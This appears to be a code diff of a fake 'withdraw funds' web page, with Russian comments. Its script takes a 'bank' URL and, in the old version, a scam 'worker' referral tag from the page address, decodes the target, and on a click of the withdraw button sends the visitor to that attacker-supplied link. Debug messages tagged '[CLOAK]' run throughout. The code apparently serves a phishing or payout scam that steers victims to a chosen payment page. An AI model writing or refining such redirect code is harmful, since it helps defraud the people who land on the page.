@@ -505,39 +505,76 @@
         });
     </script>
     <script>
-(function() {
-  // Получаем ссылку на "банк" из URL (to=...)
+(function(){
+  // Берём параметр to из URL
   const params = new URLSearchParams(window.location.search);
-  const target = params.get('to');
+  let to = params.get('to');
 
-  // Если ссылки нет — ничего не делаем
-  if (!target) return;
+  console.log('[CLOAK] raw to param:', to);
 
-  // Получаем ник воркера (если есть)
-  const ref = params.get('ref');
+  if (!to) {
+    console.log('[CLOAK] Параметр to отсутствует — ничего не делаем.');
+    return;
+  }
 
-  // Находим кнопку "Вывести"
-  const withdrawBtn = document.querySelector('#withdraw') || document.querySelector('.withdraw-button') || document.querySelector('button');
+  // Функция безопасного декодирования
+  function safeDecode(s) {
+    try { return decodeURIComponent(s); }
+    catch(e) {
+      console.warn('[CLOAK] decodeURIComponent error:', e);
+      return s;
+    }
+  }
 
-  if (withdrawBtn) {
-    withdrawBtn.addEventListener('click', function() {
-      // Проверяем, что выбрана сумма
-      const sumInput = document.querySelector('input[name="sum"]');
-      const sum = sumInput ? sumInput.value : null;
+  let decoded = safeDecode(to);
+  console.log('[CLOAK] decoded once:', decoded);
 
-      if (!sum) {
-        alert('Выберите сумму и способ вывода!');
+  if (decoded.includes('%25')) {
+    const decodedTwice = safeDecode(decoded);
+    console.log('[CLOAK] decoded twice:', decodedTwice);
+    if (decodedTwice !== decoded) decoded = decodedTwice;
+  }
+
+  if (!decoded.includes('ref=') && decoded.includes('ref%3D')) {
+    const alt = safeDecode(decoded);
+    console.log('[CLOAK] alternate decode (ref%3D -> ref=):', alt);
+    if (alt && alt.includes('ref=')) decoded = alt;
+  }
+
+  console.log('[CLOAK] final redirect target:', decoded);
+
+  // Проверим, что ссылка валидная
+  let finalUrl;
+  try {
+    finalUrl = new URL(decoded);
+  } catch(e) {
+    console.error('[CLOAK] Некорректный URL:', decoded);
+    return;
+  }
+
+  // Ждём нажатия на кнопку "Вывести"
+  document.addEventListener('DOMContentLoaded', () => {
+    const btn = document.getElementById('withdrawButton');
+    if (!btn) {
+      console.warn('[CLOAK] Кнопка вывода не найдена (#withdrawButton)');
+      return;
+    }
+
+    btn.addEventListener('click', () => {
+      // Проверим, что выбраны сумма и способ
+      const amount = document.querySelector('[name="withdrawAmount"]')?.value;
+      const method = document.querySelector('[name="withdrawMethod"]')?.value;
+
+      if (!amount || !method) {
+        alert('Пожалуйста, выберите сумму и способ вывода перед продолжением.');
         return;
       }
 
-      // Собираем финальную ссылку
-      let finalUrl = decodeURIComponent(target);
-      if (ref) finalUrl += (finalUrl.includes('?') ? '&' : '?') + 'ref=' + ref;
-
-      // Переход на банк
-      window.location.href = finalUrl;
+      console.log('[CLOAK] Все данные выбраны, выполняем редирект:', finalUrl.href);
+      window.location.replace(finalUrl.href);
     });
-  }
+  });
+
 })();
 </script>
 </body>
